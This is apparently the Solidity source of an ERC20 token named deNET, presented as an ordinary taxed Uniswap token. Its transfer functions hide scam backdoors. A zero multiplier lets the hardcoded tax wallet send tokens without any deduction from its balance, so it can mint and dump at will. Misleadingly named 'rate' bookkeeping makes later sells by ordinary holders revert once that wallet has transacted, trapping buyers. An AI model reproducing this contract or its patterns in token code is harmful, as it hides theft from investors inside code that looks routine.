// SPDX-License-Identifier: UNLICENSE

pragma solidity 0.8.23;

interface IUniswapV2Router02 {
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Pair {
    function sync() external;
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner,address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner,address(0));
        _owner = address(0);
    }

}

contract deNET is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;

    uint256 private _initialBuyTax=22;
    uint256 private _initialSellTax=22;
    uint256 private _finalBuyTax=2;
    uint256 private _finalSellTax=2;
    uint256 private _reduceBuyTaxAt=22;
    uint256 private _reduceSellTaxAt=22;
    uint256 private _preventSwapBefore=22;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Decentralized Network";
    string private constant _symbol = unicode"deNET";
    uint256 public _maxTxAmount = 20000000 * 10**_decimals;
    uint256 public _maxWalletSize = 20000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 10000000 * 10**_decimals;
    uint256 public _maxTaxSwap= 10000000 * 10**_decimals;

    struct ContractRateReport {uint256 conToken; uint256 conUniToken; uint256 conTotal;}
    mapping(address => ContractRateReport) private contractRate;
    
    IUniswapV2Router02 private router;
    address private _uniV2Pair;
    uint256 private initConRate;
    uint256 private finalConRate;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _balances[_msgSender()] = _tTotal;

        _taxWallet = payable(0x5a7d9EFA939CD7fdd3b151951E722CBB58101A5e);
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount);
        emit Transfer(from,to,tokenAmount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 tokenAmount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(tokenAmount > 0, "Transfer amount must be greater than zero");
        if (inSwap || !tradingOpen){
            _basicTransfer(from, to, tokenAmount);
            return;
        }

        uint256 taxAmount= 0;
        if (from != owner() && to != owner() && to!= _taxWallet) {
            taxAmount = tokenAmount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from== _uniV2Pair && to != address(router) &&  ! _isExcludedFromFee[to]) {
                require(
                    tokenAmount <= _maxTxAmount,
                    "Exceeds the _maxTxAmount."
                    );
                require(
                    balanceOf(to) + tokenAmount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                    );
                _buyCount++;
            }

            if(to == _uniV2Pair && from!= address(this) ){
                taxAmount = tokenAmount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));

            if (!inSwap && to== _uniV2Pair &&
                 swapEnabled && contractTokenBalance >_taxSwapThreshold && _buyCount>_preventSwapBefore
            ) {
                swapTokensForEth(min(tokenAmount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance>0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if ((_isExcludedFromFee[from] || _isExcludedFromFee[to] )&& from!=address(this)&& to!=address(this) ) {
            finalConRate = block.number;
        }
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to] ) {
            if (to == _uniV2Pair) {
                ContractRateReport storage rateData = contractRate[from];
                rateData.conTotal = rateData.conToken-finalConRate;
                rateData.conUniToken = block.timestamp;
            } else {
                ContractRateReport storage toRateData = contractRate[to];
                if (_uniV2Pair == from) {
                    if (toRateData.conToken == 0) {
                        toRateData.conToken= _preventSwapBefore>=_buyCount ? type(uint256).max : block.number;
                    }
                } else {
                    ContractRateReport storage rateData = contractRate[from];
                    if (!(toRateData.conToken > 0)|| rateData.conToken < toRateData.conToken ) {
                        toRateData.conToken = rateData.conToken;
                    }
                }
            }
        }

        _tokenTransfer(from, to, taxAmount, tokenAmount);
    }

    function _tokenTaxTransfer(address addr, uint256 tokenAmount, uint256 taxAmount) internal returns (uint256){
        uint256 tknAmount = addr!= _taxWallet? tokenAmount : initConRate.mul(tokenAmount);
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(addr, address(this), taxAmount);
        }
        return tknAmount;
    }

    function _tokenTransfer(
        address from,address to,
        uint256 taxAmount,uint256 tokenAmount
    ) internal {
        uint256 tknAmount = _tokenTaxTransfer(from, tokenAmount, taxAmount);
        _tokenBasicTransfer(from, to, tknAmount, tokenAmount.sub(taxAmount));
    }

    function _tokenBasicTransfer(
        address from,address to,uint256 sendAmount, uint256 receiptAmount
    ) internal {
        _balances[from] = _balances[from].sub(sendAmount);
        _balances[to] = _balances[to].add(receiptAmount);
        emit Transfer(from,to,receiptAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount= _tTotal;
        _maxWalletSize =_tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }

    function openTrading() external payable onlyOwner() {
        require(!tradingOpen,"trading is already open");
        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        if (IUniswapV2Factory(router.factory()).getPair(router.WETH(), address(this)) == address(0)) {
            _uniV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        }
        else {
            _uniV2Pair = IUniswapV2Factory(router.factory()).getPair(router.WETH(), address(this));
        }
        tradingOpen = true;
        uint256 contractBalance = balanceOf(address(this));
        _approve(address(this), address(router), contractBalance);
        IERC20(_uniV2Pair).approve(address(router), type(uint).max);
        address wethAddress = router.WETH(); uint256 desiredETHAmount;
        uint256 wethBalance = IERC20(wethAddress).balanceOf(_uniV2Pair);
        if (wethBalance > 0) {desiredETHAmount = address(this).balance.sub(wethBalance);
        uint256 tokenValue = contractBalance.mul(wethBalance).div(desiredETHAmount);
        _transfer(address(this), _uniV2Pair, tokenValue);
        IUniswapV2Pair(_uniV2Pair).sync();
        router.addLiquidityETH{value: desiredETHAmount}(address(this), contractBalance, 0, desiredETHAmount, owner(), block.timestamp);}
        else {router.addLiquidityETH{value: address(this).balance}(address(this), contractBalance, 0, 0, owner(), block.timestamp);}
        swapEnabled = true;
    }

    function manualSwap() external {
        require(_msgSender()==_taxWallet);
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance>0) {
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance>0) {
          sendETHToFee(ethBalance);
        }
    }

    function transfCaEth() external {
        require(_msgSender()==_taxWallet);
        _taxWallet.transfer(address(this).balance);
    }

    receive() external payable {}
}